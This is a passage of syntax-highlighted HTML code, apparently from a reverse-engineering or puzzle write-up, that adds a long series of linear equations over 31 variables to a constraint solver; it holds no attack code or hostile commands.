+</span><br><span class="line"><span class="number">31</span>*a16 +<span class="number">74</span>*a17 +<span class="number">11</span>*a18+<span class="number">87</span>*a19 +<span class="number">76</span>*a20 +<span class="number">26</span>*a21 +<span class="number">40</span>*a22 +</span><br><span class="line"><span class="number">13</span>*a23 +<span class="number">31</span>*a24 + <span class="number">39</span>*a25 + <span class="number">7</span>*a26 +<span class="number">84</span>*a27 + <span class="number">65</span>*a28 +<span class="number">25</span>*a29 +</span><br><span class="line"><span class="number">88</span>*a30+<span class="number">13</span>*a31==<span class="number">159700</span>)</span><br><span class="line"></span><br><span class="line">slover.add(<span class="number">76</span>*a1+<span class="number">23</span>*a2 +<span class="number">47</span>*a3 +<span class="number">95</span>*a4 +<span class="number">56</span>*a5 + <span class="number">94</span>*a6 + <span class="number">9</span>*a7 +<span class="number">89</span>*a8 +</span><br><span class="line"><span class="number">1</span>*a9 +<span class="number">27</span>*a10 + <span class="number">64</span>*a11 + <span class="number">54</span>*a12 +<span class="number">77</span>*a13 +<span class="number">57</span>*a14 +<span class="number">11</span>*a15 +</span><br><span class="line"><span class="number">80</span>*a16+<span class="number">61</span>*a17+<span class="number">98</span>*a18 + <span class="number">14</span>*a19 + <span class="number">72</span>*a20 + <span class="number">67</span>*a21 +<span class="number">98</span>*a22 +</span><br><span class="line"><span class="number">66</span>*a23 +<span class="number">26</span>*a24 +<span class="number">11</span>*a25+<span class="number">36</span>*a26 +<span class="number">94</span>*a27 +<span class="number">66</span>*a28 +<span class="number">99</span>*a29 +</span><br><span class="line"><span class="number">64</span>*a30 +<span class="number">40</span>*a31==<span class="number">171444</span>)</span><br><span class="line"></span><br><span class="line">slover.add(<span class="number">49</span>*a1 + <span class="number">38</span>*a2 + <span class="number">20</span>*a3 +<span class="number">28</span>*a4 +<span class="number">36</span>*a5 + <span class="number">44</span>*a6 +<span class="number">85</span>*a7 +<span class="number">48</span>*a8 +</span><br><span class="line"><span class="number">74</span>*a9 +<span class="number">73</span>*a10 +<span class="number">27</span>*a11 +<span class="number">99</span>*a12 +<span class="number">21</span>*a13+ <span class="number">72</span>*a14 + <span class="number">89</span>*a15 +</span><br><span class="line"><span class="number">3</span>*a16 +<span class="number">3</span>*a17 +<span class="number">72</span>*a18 + <span class="number">71</span>*a19 + <span class="number">29</span>*a20 +<span class="number">92</span>*a21 +<span class="number">19</span>*a22 +</span><br><span class="line"><span class="number">42</span>*a23+<span class="number">87</span>*a24 +<span class="number">97</span>*a25 +<span class="number">36</span>*a26 +<span class="number">84</span>*a27 +<span class="number">56</span>*a28 +<span class="number">96</span>*a29 +</span><br><span class="line"><span class="number">40</span>*a30 +<span class="number">82</span>*a31==<span class="number">164206</span>)</span><br><span class="line"></span><br><span class="line">slover.add(<span class="number">81</span>*a1 + <span class="number">88</span>*a2 +<span class="number">41</span>*a3 +<span class="number">98</span>*a4+ <span class="number">8</span>*a5 + <span class="number">70</span>*a6 + <span class="number">19</span>*a7 + <span class="number">85</span>*a8 +</span><br><span class="line"><span class="number">37</span>*a9 +<span class="number">64</span>*a10 + <span class="number">24</span>*a11 +<span class="number">96</span>*a12 + <span class="number">94</span>*a13 + <span class="number">78</span>*a14 + <span class="number">81</span>*a15 +</span><br><span class="line"><span class="number">38</span>*a16 + <span class="number">10</span>*a17 +<span class="number">87</span>*a18 + <span class="number">75</span>*a19 + <span class="number">35</span>*a20 + <span class="number">7</span>*a21 + <span class="number">98</span>*a22 +</span><br><span class="line"><span class="number">63</span>*a23 + <span class="number">37</span>*a24 + <span class="number">4</span>*a25 +<span class="number">40</span>*a26 +<span class="number">13</span>*a27 + <span class="number">83</span>*a28 + <span class="number">99</span>*a29 +</span><br><span class="line"><span class="number">61</span>*a30 + <span class="number">60</span>*a31== <span class="number">171511</span>)</span><br><span class="line"></span><br><span class="line">slover.add(<span class="number">53</span>*a1 + <span class="number">39</span>*a2 + <span class="number">10</span>*a3 +<span class="number">36</span>*a4 + <span class="number">37</span>*a5 + <span class="number">42</span>*a6 + <span class="number">69</span>*a7 +<span class="number">66</span>*a8 +</span><br><span class="line"><span class="number">22</span>*a9 +<span class="number">33</span>*a10 + <span class="number">34</span>*a11 + <span class="number">4</span>*a12 +<span class="number">77</span>*a13 + <span class="number">94</span>*a14 +<span class="number">51</span>*a15 +</span><br><span class="line"><span class="number">87</span>*a16+<span class="number">3</span>*a17+ <span class="number">34</span>*a18 + <span class="number">44</span>*a19 +<span class="number">17</span>*a20+<span class="number">48</span>*a21 + <span class="number">31</span>*a22 +</span><br><span class="line"><span class="number">62</span>*a23+<span class="number">15</span>*a24 +<span class="number">59</span>*a25 +<span class="number">39</span>*a26 +<span class="number">42</span>*a27 +<span class="number">48</span>*a28 +<span class="number">63</span>*a29 +</span><br><span class="line"><span class="number">44</span>*a30 +<span class="number">84</span>*a31== <span class="number">131705</span>)</span><br><span class="line"></span><br><span class="line">slover.add(<span class="number">95</span>*a1 + <span class="number">37</span>*a2 +<span class="number">70</span>*a3 +<span class="number">10</span>*a4+ <span class="number">72</span>*a5 + <span class="number">37</span>*a6 +<span class="number">26</span>*a7 +<span class="number">11</span>*a8 +</span><br><span class="line"><span class="number">89</span>*a9 +<span class="number">36</span>*a10 + <span class="number">80</span>*a11 + <span class="number">81</span>*a12 + <span class="number">13</span>*a13 + <span class="number">84</span>*a14 +<span class="number">79</span>*a15 +</span><br><span class="line"><span class="number">69</span>*a16 + <span class="number">15</span>*a17 + <span class="number">53</span>*a18+<span class="number">52</span>*a19 +<span class="number">92</span>*a20 +<span class="number">13</span>*a21 +<span class="number">44</span>*a22 +</span><br><span class="line"><span class="number">33</span>*a23 +<span class="number">48</span>*a24 +<span class="number">77</span>*a25 +<span class="number">40</span>*a26 +<span class="number">50</span>*a27 +<span class="number">20</span>*a28 +<span class="number">9</span>*a29 +</span><br><span class="line"><span class="number">69</span>*a30 +<span class="number">44</span>*a31== <span class="number">149011</span>)</span><br><span class="line"></span><br><span class="line">slover.add(<span class="number">58</span>*a1 + <span class="number">53</span>*a2 +<span class="number">93</span>*a3 + <span class="number">4</span>*a4 +<span class="number">33</span>*a5 + <span class="number">76</span>*a6 + <span class="number">88</span>*a7 +<span class="number">7</span>*a8 +</span><br><span class="line"><span class="number">21</span>*a9+<span class="number">24</span>*a10 +<span class="number">8</span>*a11 +<span class="number">35</span>*a12 +<span class="number">64</span>*a13 +<span class="number">54</span>*a14 +<span class="number">20</span>*a15 +</span><br><span class="line"><span class="number">1</span>*a16+<span class="number">4</span>*a17 +<span class="number">42</span>*a18 + <span class="number">29</span>*a19 + <span class="number">96</span>*a20 + <span class="number">40</span>*a21 +<span class="number">22</span>*a22 +</span><br><span class="line"><span class="number">39</span>*a23 + <span class="number">47</span>*a24 + <span class="number">4</span>*a25 +<span class="number">42</span>*a26 + <span class="number">31</span>*a27 + <span class="number">69</span>*a28 + <span class="number">39</span>*a29 +</span><br><span class="line"><span class="number">6</span>*a30 +<span class="number">50</span>*a31==<span class="number">114939</span>)</span><br><span class="line"></span><br><span class="line">slover.add(<span class="number">89</span>*a1 + <span class="number">73</span>*a2 +<span class="number">43</span>*a3 + <span class="number">41</span>*a4 + <span class="number">28</span>*a5 + <span class="number">19</span>*a6 + <span class="number">83</span>*a7 + <span class="number">32</span>*a8 +</span><br><span class="line"><span class="number">65</span>*a9 +<span class="number">37</span>*a10 +<span class="number">22</span>*a11 +<span class="number">22</span>*a12 +<span class="number">42</span>*a13 +<span class="number">74</span>*a14 + <span class="number">43</span>*a15 +</span><br><span class="line"><span class="number">72</span>*a16+<span class="number">4</span>*a17 +<span class="number">94</span>*a18 + <span class="number">66</span>*a19 + <span class="number">60</span>*a20 + <span class="number">63</span>*a21 +<span class="number">91</span>*a22 +</span><br><span class="line"><span class="number">69</span>*a23 + <span class="number">7</span>*a24 + <span class="number">39</span>*a25 + <span class="number">96</span>*a26 + <span class="number">76</span>*a27 +<span class="number">5</span>*a28 +<span class="number">32</span>*a29 +</span><br><span class="line"><span class="number">57</span>*a30 +<span class="number">22</span>*a31== <span class="number">147181</span>)</span><br><span class="line"></span><br><span class="line">slover.add(<span class="number">76</span>*a1 + <span class="number">83</span>*a2 + <span class="number">10</span>*a3 + <span class="number">31</span>*a4 +<span class="number">18</span>*a5 + <span class="number">2</span>*a6 + <span class="number">2</span>*a7 + <span class="number">65</span>*a8 +</span><br><span class="line"><span class="number">27</span>*a9 + <span class="number">47</span>*a10 +<span class="number">63</span>*a11 +<span class="number">61</span>*a12 + <span class="number">77</span>*a13 + <span class="number">38</span>*a14+<span class="number">22</span>*a15 +</span><br><span class="line"><span class="number">49</span>*a16+<span class="number">4</span>*a17 +<span class="number">2</span>*a18 +<span class="number">63</span>*a19 +<span class="number">24</span>*a20 +<span class="number">16</span>*a21 + <span class="number">36</span>*a22 +</span><br><span class="line"><span class="number">48</span>*a23 + <span class="number">50</span>*a24 +<span class="number">40</span>*a25 + <span class="number">78</span>*a26 + <span class="number">19</span>*a27 + <span class="number">95</span>*a28 +<span class="number">73</span>*a29 +</span><br><span class="line"><span class="number">47</span>*a30 +<span class="number">56</span>*a31 == <span class="number">128931</span>)</span><br><span class="line"></span><br><span class="line">slover.add(<span class="number">93</span>*a1 + <span class="number">3</span>*a2 +<span class="number">86</span>*a3 + <span class="number">90</span>*a4 + <span class="number">97</span>*a5 +<span class="number">11</span>*a6 + <span class="number">66</span>*a7 +<span class="number">69</span>*a8 +</span><br><span class="line"><span class="number">96</span>*a9 +<span class="number">62</span>*a10 +<span class="number">40</span>*a11 +<span class="number">58</span>*a12 +<span class="number">25</span>*a13+<span class="number">64</span>*a14 + <span class="number">50</span>*a15 +</span><br><span class="line"><span class="number">65</span>*a16+<span class="number">59</span>*a17 + <span class="number">5</span>*a18 + <span class="number">7</span>*a19 +<span class="number">55</span>*a20 +<span class="number">92</span>*a21 +<span class="number">29</span>*a22 +</span><br><span class="line"><span class="number">35</span>*a23 +<span class="number">83</span>*a24 +<span class="number">59</span>*a25 + <span class="number">55</span>*a26 + <span class="number">51</span>*a27 +<span class="number">62</span>*a28+<span class="number">1</span>*a29 +</span><br><span class="line"><span class="number">64</span>*a30 +<span class="number">12</span>*a31==<span class="number">159474</span>)</span><br><span class="line"></span><br><span class="line">slover.add(<span class="number">60</span>*a1 +<span class="number">19</span>*a2 +<span class="number">66</span>*a3 +<span class="number">62</span>*a4 + <span class="number">42</span>*a5 + <span class="number">86</span>*a6 + <span class="number">61</span>*a7 +<span class="number">63</span>*a8 +</span><br><span class="line"><span class="number">56</span>*a9 +<span class="number">2</span>*a10 +<span class="number">46</span>*a11 +<span class="number">7</span>*a12 + <span class="number">7</span>*a13 +<span class="number">2</span>*a14 + <span class="number">16</span>*a15 +</span><br><span class="line"><span class="number">97</span>*a16 +<span class="number">12</span>*a17 + <span class="number">28</span>*a18 + <span class="number">11</span>*a19 +<span class="number">92</span>*a20 + <span class="number">26</span>*a21 +<span class="number">64</span>*a22 +</span><br><span class="line"><span class="number">63</span>*a23 +<span class="number">62</span>*a24 +<span class="number">45</span>*a25+<span class="number">56</span>*a26 +<span class="number">50</span>*a27 +<span class="number">97</span>*a28 +<span class="number">62</span>*a29 +</span><br><span class="line"><span class="number">71</span>*a30 + <span class="number">65</span>*a31 == <span class="number">146558</span>)</span><br><span class="line"></span><br><span class="line">slover.add(<span class="number">11</span>*a1 + <span class="number">79</span>*a2 + <span class="number">17</span>*a3 + <span class="number">68</span>*a4+ <span class="number">26</span>*a5 + <span class="number">38</span>*a6 +<span class="number">23</span>*a7 +<span class="number">78</span>*a8 +</span><br><span class="line"><span class="number">82</span>*a9 +<span class="number">71</span>*a10 +<span class="number">46</span>*a11 +<span class="number">18</span>*a12 +<span class="number">20</span>*a13 +<span class="number">19</span>*a14 +<span class="number">89</span>*a15 +</span><br><span class="line"><span class="number">86</span>*a16 +<span class="number">20</span>*a17 +<span class="number">54</span>*a18 +<span class="number">47</span>*a19 +<span class="number">15</span>*a20+<span class="number">62</span>*a21 +<span class="number">49</span>*a22 +</span><br><span class="line"><span class="number">97</span>*a23 + <span class="number">75</span>*a24 +<span class="number">17</span>*a25+<span class="number">76</span>*a26 +<span class="number">52</span>*a27 +<span class="number">62</span>*a28 +<span class="number">65</span>*a29 +</span><br><span class="line"><span class="number">89</span>*a30 + <span class="number">80</span>*a31 == <span class="number">158569</span>)</span><br><span class="line"></span><br><span class="line">slover.add(<span class="number">79</span>*a1 + <span class="number">10</span>*a2 +<span class="number">66</span>*a3+<span class="number">31</span>*a4+<span class="number">76</span>*a5 + <span class="number">58</span>*a6 +<span class="number">45</span>*a7 +<span class="number">64</span>*a8 +</span><br><span class="line"><span class="number">97</span>*a9 +<span class="number">9</span>*a10 + <span class="number">15</span>*a11 + <span class="number">6</span>*a12 +<span class="number">61</span>*a13 + <span class="number">65</span>*a14 +<span class="number">52</span>*a15 +</span><br><span class="line"><span class="number">1</span>*a16 + <span class="number">38</span>*a17 + <span class="number">11</span>*a18 + <span class="number">66</span>*a19 + <span class="number">21</span>*a20 +<span class="number">30</span>*a21 + <span class="number">76</span>*a22 +</span><br><span class="line"><span class="number">41</span>*a23 + <span class="number">75</span>*a24 +<span class="number">52</span>*a25+<span class="number">45</span>*a26 +<span class="number">91</span>*a27 +<span class="number">96</span>*a28 +<span class="number">29</span>*a29 +</span><br><span class="line"><span class="number">64</span>*a30 +<span class="number">59</span>*a31 == <span class="number">149303</span>)</span><br><span class="line"></span><br><span class="line">slover.add(<span class="number">87</span>*a1 +<span class="number">64</span>*a2 +<span class="number">72</span>*a3 +<span class="number">22</span>*a4 + <span class="number">38</span>*a5 + <span class="number">64</span>*a6 + <span class="number">27</span>*a7 +<span class="number">35</span>*a8 +</span><br><span class="line"><span class="number">18</span>*a9 + <span class="number">24</span>*a10 +<span class="number">64</span>*a11 +<span class="number">80</span>*a12 + <span class="number">35</span>*a13 + <span class="number">56</span>*a14 + <span class="number">39</span>*a15 +</span><br><span class="line"><span class="number">97</span>*a16+<span class="number">83</span>*a17 + <span class="number">88</span>*a18 + <span class="number">21</span>*a19 + <span class="number">51</span>*a20 +<span class="number">76</span>*a21 +<span class="number">63</span>*a22 +</span><br><span class="line"><span class="number">54</span>*a23 +<span class="number">38</span>*a24 +<span class="number">92</span>*a25+<span class="number">56</span>*a26 +<span class="number">84</span>*a27 +<span class="number">75</span>*a28 +<span class="number">38</span>*a29 +</span><br><span class="line"><span class="number">2</span>*a30 + <span class="number">43</span>*a31==<span class="number">162212</span>)</span><br><span class="line"></span><br><span class="line">slover.add(<span class="number">89</span>*a1 + <span class="number">93</span>*a2 + <span class="number">48</span>*a3 +<span class="number">5</span>*a4 +<span class="number">37</span>*a5 + <span class="number">76</span>*a6 + <span class="number">32</span>*a7 + <span class="number">66</span>*a8 +</span><br><span class="line"><span class="number">25</span>*a9 + <span class="number">39</span>*a10 + <span class="number">59</span>*a11 + <span class="number">14</span>*a12 +<span class="number">48</span>*a13 +<span class="number">62</span>*a14 +<span class="number">4</span>*a15 +</span><br><span class="line"><span class="number">76</span>*a16 + <span class="number">72</span>*a17 + <span class="number">78</span>*a18+<span class="number">40</span>*a19 +<span class="number">96</span>*a20 +<span class="number">68</span>*a21 +<span class="number">35</span>*a22 +</span><br><span class="line"><span class="number">89</span>*a23 + <span class="number">3</span>*a24 +<span class="number">29</span>*a25 +<span class="number">17</span>*a26 + <span class="number">63</span>*a27 + <span class="number">43</span>*a28 +<span class="number">61</span>*a29 +</span><br><span class="line"><span class="number">37</span>*a30 +<span class="number">12</span>*a31==<span class="number">142706</span>)</span><br><span class="line"></span><br><span class="line">slover.add(<span class="number">4</span>*a1 +<span class="number">25</span>*a2 + <span class="number">16</span>*a3 +<span class="number">45</span>*a4 + <span class="number">65</span>*a5 +<span class="number">17</span>*a6 + <span class="number">39</span>*a7 +<span class="number">59</span>*a8 +</span><br><span class="line"><span class="number">82</span>*a9 +<span class="number">54</span>*a10 +<span class="number">69</span>*a11 +<span class="number">59</span>*a12+<span class="number">86</span>*a13 +<span class="number">37</span>*a14 +<span class="number">70</span>*a15+</span><br><span class="line"><span class="number">21</span>*a16 + <span class="number">46</span>*a17 + <span class="number">89</span>*a18 + <span class="number">96</span>*a19 + <span class="number">32</span>*a20 + <span class="number">35</span>*a21 +<span class="number">69</span>*a22 +</span><br><span class="line"><span class="number">22</span>*a23 +<span class="number">13</span>*a24 +<span class="number">95</span>*a25 + <span class="number">58</span>*a26 +<span class="number">94</span>*a27 +<span class="number">29</span>*a28+<span class="number">84</span>*a29 +</span><br><span class="line"><span class="number">24</span>*a30 + <span class="number">3</span>*a31==<span class="number">146480</span>)</span><br><span class="line"></span><br><span class="line">slover.add(<span class="number">50</span>*a1 +<span class="number">48</span>*a2 +<span class="number">87</span>*a3 +<span class="number">37</span>*a4 + <span class="number">53</span>*a5 + <span class="number">19</span>*a6 +<span class="number">24</span>*a7 +<span class="number">30</span>*a8 +</span><br><span class="line"><span class="number">40</span>*a9 +<span class="number">31</span>*a10 +<span class="number">18</span>*a11 +<span class="number">89</span>*a12 +<span class="number">81</span>*a13 + <span class="number">70</span>*a14 +<span class="number">98</span>*a15 +</span><br><span class="line"><span class="number">87</span>*a16 +<span class="number">98</span>*a17 +<span class="number">82</span>*a18+<span class="number">31</span>*a19+<span class="number">71</span>*a20+<span class="number">30</span>*a21 +<span class="number">28</span>*a22 +</span><br><span class="line"><span class="number">95</span>*a23 +<span class="number">22</span>*a24 +<span class="number">15</span>*a25+<span class="number">73</span>*a26 +<span class="number">51</span>*a27 +<span class="number">92</span>*a28 +<span class="number">32</span>*a29 +</span><br><span class="line"><span class="number">97</span>*a30 + <span class="number">65</span>*a31 == <span class="number">168401</span>)</span><br><span class="line"></span><br><span class="line">slover.add(<span class="number">40</span>*a1+<span class="number">20</span>*a2+<span class="number">13</span>*a3+<span class="number">25</span>*a4+ <span class="number">87</span>*a5 + <span class="number">95</span>*a6 + <span class="number">47</span>*a7 +<span class="number">80</span>*a8 +</span><br><span class="line"><span class="number">22</span>*a9 +<span class="number">43</span>*a10 + <span class="number">4</span>*a11 + <span class="number">83</span>*a12 + <span class="number">50</span>*a13 +<span class="number">85</span>*a14 + <span class="number">39</span>*a15 +</span><br><span class="line"><span class="number">22</span>*a16+<span class="number">75</span>*a17 +<span class="number">3</span>*a18 + <span class="number">22</span>*a19 +<span class="number">6</span>*a20 +<span class="number">16</span>*a21 +<span class="number">29</span>*a22 +</span><br><span class="line"><span class="number">65</span>*a23 + <span class="number">19</span>*a24 + <span class="number">64</span>*a25 +<span class="number">48</span>*a26 +<span class="number">41</span>*a27 +<span class="number">8</span>*a28 +<span class="number">10</span>*a29 +</span><br><span class="line"><span class="number">66</span>*a30 +<span class="number">12</span>*a31== <span class="number">117331</span>)</span><br><span class="line"></span><br><span class="line">slover.add(<span class="number">37</span>*a1 + <span class="number">49</span>*a2 + <span class="number">63</span>*a3 + <span class="number">49</span>*a4+ <span class="number">3</span>*a5 + <span class="number">54</span>*a6 + <span class="number">52</span>*a7 +<span class="number">61</span>*a8 +</span><br><span class="line"><span class="number">58</span>*a9 + <span class="number">36</span>*a10 + <span class="number">24</span>*a11 + <span class="number">6</span>*a12 +<span class="number">46</span>*a13 +<span class="number">47</span>*a14 +<span class="number">16</span>*a15 +</span><br><span class="line"><span class="number">29</span>*a16 + <span class="number">83</span>*a17 +<span class="number">2</span>*a18 + <span class="number">50</span>*a19 + <span class="number">94</span>*a20 + <span class="number">38</span>*a21 +<span class="number">56</span>*a22 +</span><br><span class="line"><span class="number">34</span>*a23+<span class="number">13</span>*a24 +<span class="number">34</span>*a25+<span class="number">12</span>*a26 + <span class="number">41</span>*a27 +<span class="number">47</span>*a28 +<span class="number">35</span>*a29 +</span><br><span class="line"><span class="number">67</span>*a30 +<span class="number">74</span>*a31== <span class="number">125357</span>)</span><br><span class="line"></span><br><span class="line">slover.add(<span class="number">37</span>*a1+ <span class="number">2</span>*a2 +<span class="number">12</span>*a3+<span class="number">84</span>*a4 +<span class="number">79</span>*a5 + <span class="number">36</span>*a6 + <span class="number">93</span>*a7 +<span class="number">64</span>*a8 +</span><br><span class="line"><span class="number">68</span>*a9 +<span class="number">7</span>*a10 +<span class="number">37</span>*a11 +<span class="number">58</span>*a12 +<span class="number">68</span>*a13+<span class="number">49</span>*a14 +<span class="number">19</span>*a15 +</span><br><span class="line"><span class="number">95</span>*a16 +<span class="number">43</span>*a17 +<span class="number">22</span>*a18+<span class="number">10</span>*a19 +<span class="number">21</span>*a20 +<span class="number">70</span>*a21 +<span class="number">72</span>*a22 +</span><br><span class="line"><span class="number">73</span>*a23+<span class="number">19</span>*a24 +<span class="number">32</span>*a25 + <span class="number">8</span>*a26 + <span class="number">6</span>*a27 + <span class="number">89</span>*a28 +<span class="number">43</span>*a29 +</span><br><span class="line"><span class="number">32</span>*a30+<span class="number">95</span>*a31== <span class="number">138223</span>)</span><br><span class="line"></span><br><span class="line">slover.add(<span class="number">24</span>*a1 + <span class="number">23</span>*a2 + <span class="number">12</span>*a3 +<span class="number">73</span>*a4 + <span class="number">32</span>*a5 + <span class="number">3</span>*a6 + <span class="number">61</span>*a7 +<span class="number">51</span>*a8 +</span><br><span class="line"><span class="number">85</span>*a9 + <span class="number">94</span>*a10 +<span class="number">36</span>*a11 + <span class="number">90</span>*a12 + <span class="number">49</span>*a13 + <span class="number">97</span>*a14+<span class="number">18</span>*a15 +</span><br><span class="line"><span class="number">55</span>*a16 +<span class="number">26</span>*a17 + <span class="number">40</span>*a18+<span class="number">39</span>*a19 +<span class="number">95</span>*a20 +<span class="number">61</span>*a21 +<span class="number">17</span>*a22 +</span><br><span class="line"><span class="number">29</span>*a23 +<span class="number">7</span>*a24 + <span class="number">40</span>*a25 +<span class="number">58</span>*a26 +<span class="number">5</span>*a27 + <span class="number">49</span>*a28 +<span class="number">2</span>*a29 +</span><br><span class="line"><span class="number">83</span>*a30 +<span class="number">69</span>*a31 == <span class="number">136759</span>)</span><br><span class="line"></span><br><span class="line">slover.add(<span class="number">64</span>*a1 +<span class="number">28</span>*a2 +<span class="number">52</span>*a3+<span class="number">74</span>*a4+ <span class="number">84</span>*a5 + <span class="number">36</span>*a6 +<span class="number">39</span>*a7 +<span class="number">55</span>*a8 +</span><br><span class="line"><span class="number">40</span>*a9 + <span class="number">44</span>*a10+ <span class="number">47</span>*a11 + <span class="number">23</span>*a12 +<span class="number">1</span>*a13 +<span class="number">58</span>*a14 +<span class="number">33</span>*a15 +</span><br><span class="line"><span class="number">25</span>*a16 +<span class="number">70</span>*a17 +<span class="number">20</span>*a18 +<span class="number">45</span>*a19 +<span class="number">33</span>*a20+<span class="number">15</span>*a21 +<span class="number">77</span>*a22 +</span><br><span class="line"><span class="number">46</span>*a23 + <span class="number">8</span>*a24 +<span class="number">5</span>*a25 + <span class="number">98</span>*a26 +<span class="number">39</span>*a27 +<span class="number">72</span>*a28 +<span class="number">9</span>*a29 +</span><br><span class="line"><span class="number">99</span>*a30 +<span class="number">25</span>*a31==<span class="number">128285</span>)</span><br><span class="line"></span><br><span class="line">slover.add(<span class="number">39</span>*a1 + <span class="number">8</span>*a2 +<span class="number">57</span>*a3 +<span class="number">39</span>*a4 +<span class="number">27</span>*a5 + <span class="number">98</span>*a6 + <span class="number">70</span>*a7 +<span class="number">77</span>*a8 +</span><br><span class="line"><span class="number">97</span>*a9 +<span class="number">20</span>*a10 + <span class="number">5</span>*a11 +<span class="number">2</span>*a12 +<span class="number">62</span>*a13 +<span class="number">88</span>*a14 +<span class="number">42</span>*a15 +</span><br><span class="line"><span class="number">58</span>*a16 +<span class="number">86</span>*a17 +<span class="number">94</span>*a18 +<span class="number">91</span>*a19 + <span class="number">76</span>*a20 + <span class="number">46</span>*a21 +<span class="number">32</span>*a22 +</span><br><span class="line"><span class="number">10</span>*a23+<span class="number">75</span>*a24 +<span class="number">99</span>*a25 + <span class="number">62</span>*a26 + <span class="number">76</span>*a27 +<span class="number">78</span>*a28 +<span class="number">72</span>*a29 +</span><br><span class="line"><span class="number">50</span>*a30 +<span class="number">50</span>*a31== <span class="number">173243</span>)</span><br><span class="line"></span><br><span class="line">slover.add(<span class="number">52</span>*a1+<span class="number">69</span>*a2 +<span class="number">20</span>*a3+<span class="number">29</span>*a4+ <span class="number">23</span>*a5 + <span class="number">30</span>*a6 + <span class="number">74</span>*a7 +<span class="number">21</span>*a8 +</span><br><span class="line"><span class="number">9</span>*a9 +<span class="number">5</span>*a10 +<span class="number">76</span>*a11 +<span class="number">5</span>*a12 +<span class="number">45</span>*a13+<span class="number">49</span>*a14 +<span class="number">59</span>*a15 +</span><br><span class="line"><span class="number">25</span>*a16 + <span class="number">98</span>*a17 + <span class="number">54</span>*a18+<span class="number">80</span>*a19 +<span class="number">19</span>*a20 +<span class="number">51</span>*a21 + <span class="number">37</span>*a22 +</span><br><span class="line"><span class="number">85</span>*a23+<span class="number">84</span>*a24 +<span class="number">78</span>*a25 +<span class="number">54</span>*a26 +<span class="number">5</span>*a27+<span class="number">21</span>*a28 +<span class="number">97</span>*a29 +</span><br><span class="line"><span class="number">92</span>*a30 +<span class="number">78</span>*a31== <span class="number">138560</span>)</span><br><span class="line"></span><br><span class="line">slover.add(<span class="number">24</span>*a1+<span class="number">70</span>*a2+<span class="number">59</span>*a3 +<span class="number">66</span>*a4+ <span class="number">7</span>*a5 + <span class="number">59</span>*a6 + <span class="number">95</span>*a7 +<span class="number">46</span>*a8 +</span><br><span class="line"><span class="number">28</span>*a9 +<span class="number">21</span>*a10 + <span class="number">99</span>*a11 + <span class="number">95</span>*a12 + <span class="number">61</span>*a13+<span class="number">43</span>*a14 +<span class="number">50</span>*a15 +</span><br><span class="line"><span class="number">3</span>*a16 + <span class="number">15</span>*a17 +<span class="number">79</span>*a18 + <span class="number">88</span>*a19 + <span class="number">51</span>*a20 + <span class="number">72</span>*a21 +<span class="number">67</span>*a22 +</span><br><span class="line"><span class="number">67</span>*a23 +<span class="number">47</span>*a24 +<span class="number">76</span>*a25+<span class="number">45</span>*a26 +<span class="number">18</span>*a27 +<span class="number">32</span>*a28 +<span class="number">82</span>*a29 +</span><br><span class="line"><span class="number">37</span>*a30 +<span class="number">20</span>*a31 == <span class="number">148441</span>)</span><br><span class="line"></span><br><span class="line">slover.add(<span class="number">76</span>*a1 +<span class="number">10</span>*a2 +<span class="number">22</span>*a3 + <span class="number">48</span>*a4 + <span class="number">64</span>*a5 + <span class="number">22</span>*a6 + <span class="number">94</span>*a7 +<span class="number">25</span>*a8 +</span><br><span class="line"><span class="number">44</span>*a9 +<span class="number">83</span>*a10 +<span class="number">24</span>*a11 +<span class="number">64</span>*a12 + <span class="number">58</span>*a13 + <span class="number">41</span>*a14 + <span class="number">4</span>*a15+</span><br><span class="line"><span class="number">29</span>*a16 + <span class="number">96</span>*a17 +<span class="number">78</span>*a18 + <span class="number">45</span>*a19 + <span class="number">30</span>*a20 +<span class="number">35</span>*a21 +<span class="number">62</span>*a22 +</span><br><span class="line"><span class="number">81</span>*a23 +<span class="number">54</span>*a24 + <span class="number">5</span>*a25 +<span class="number">82</span>*a26 + <span class="number">14</span>*a27 +<span class="number">46</span>*a28 +<span class="number">16</span>*a29 +</span><br><span class="line"><span class="number">18</span>*a30 +<span class="number">69</span>*a31 == <span class="number">134112</span>)</span><br><span class="line"></span><br><span class="line">slover.add(<span class="number">65</span>*a1 +<span class="number">72</span>*a2 +<span class="number">44</span>*a3 +<span class="number">52</span>*a4+ <span class="number">29</span>*a5 + <span class="number">17</span>*a6 + <span class="number">31</span>*a7 + <span class="number">44</span>*a8 +</span><br><span class="line"><span class="number">58</span>*a9 + <span class="number">26</span>*a10 + <span class="number">47</span>*a11 + <span class="number">82</span>*a12 +<span class="number">47</span>*a13 + <span class="number">80</span>*a14 +<span class="number">3</span>*a15 +</span><br><span class="line"><span class="number">97</span>*a16+<span class="number">88</span>*a17+<span class="number">9</span>*a18 + <span class="number">10</span>*a19 + <span class="number">21</span>*a20 + <span class="number">79</span>*a21 +<span class="number">27</span>*a22 +</span><br><span class="line"><span class="number">49</span>*a23 +<span class="number">24</span>*a24 +<span class="number">2</span>*a25 +<span class="number">64</span>*a26 + <span class="number">60</span>*a27 + <span class="number">45</span>*a28+<span class="number">19</span>*a29 +</span><br><span class="line"><span class="number">97</span>*a30 +<span class="number">76</span>*a31==<span class="number">140899</span>)</span><br><span class="line"></span><br><span class="line">slover.add(<span class="number">98</span>*a1+<span class="number">61</span>*a2 +<span class="number">33</span>*a3 +<span class="number">62</span>*a4+ <span class="number">50</span>*a5 + <span class="number">7</span>*a6 + <span class="number">88</span>*a7 +<span class="number">75</span>*a8 +</span><br><span class="line"><span class="number">94</span>*a9 +<span class="number">21</span>*a10 + <span class="number">37</span>*a11 + <span class="number">55</span>*a12 + <span class="number">32</span>*a13 +<span class="number">39</span>*a14 + <span class="number">42</span>*a15 +</span><br><span class="line"><span class="number">11</span>*a16+<span class="number">48</span>*a17 +<span class="number">87</span>*a18 + <span class="number">34</span>*a19 + <span class="number">14</span>*a20 +<span class="number">76</span>*a21 +<span class="number">13</span>*a22 +</span><br><span class="line"><span class="number">39</span>*a23 +<span class="number">27</span>*a24 +<span class="number">62</span>*a25 + <span class="number">38</span>*a26 + <span class="number">53</span>*a27 +<span class="number">27</span>*a28 +<span class="number">20</span>*a29 +</span><br><span class="line"><span class="number">67</span>*a30 + <span class="number">94</span>*a31== <span class="number">145615</span>)</span><br><span class="line"></span><br><span class="line">slover.add(<span class="number">54</span>*a1+<span class="number">23</span>*a2 +<span class="number">33</span>*a3 +<span class="number">16</span>*a4+ <span class="number">7</span>*a5 +<span class="number">12</span>*a6 + <span class="number">58</span>*a7 +<span class="number">67</span>*a8 +</span><br><span class="line"><span class="number">88</span>*a9 